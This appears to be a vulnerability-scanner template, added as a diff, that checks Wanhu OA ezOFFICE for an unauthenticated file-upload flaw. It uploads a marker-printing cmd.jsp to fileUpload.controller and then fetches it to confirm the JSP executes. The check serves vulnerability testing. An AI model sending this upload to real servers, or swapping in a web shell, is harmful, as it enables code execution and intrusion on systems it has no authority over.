@@ -1,0 +1,19 @@
+name: 万户OA-ezOFFICE-fileUpload.controller文件上传
+description: >
+  jsp文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /defaultroot/upload/fileUpload.controller
+    headers:
+      Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
+    search: '"data":"(?P<filename>[^"]+)"'
+    body: "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(\"Rscan_test\");%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
+    expression:
+      status: 200
+  - method: GET
+    path: /defaultroot/upload/html/{{filename}}
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
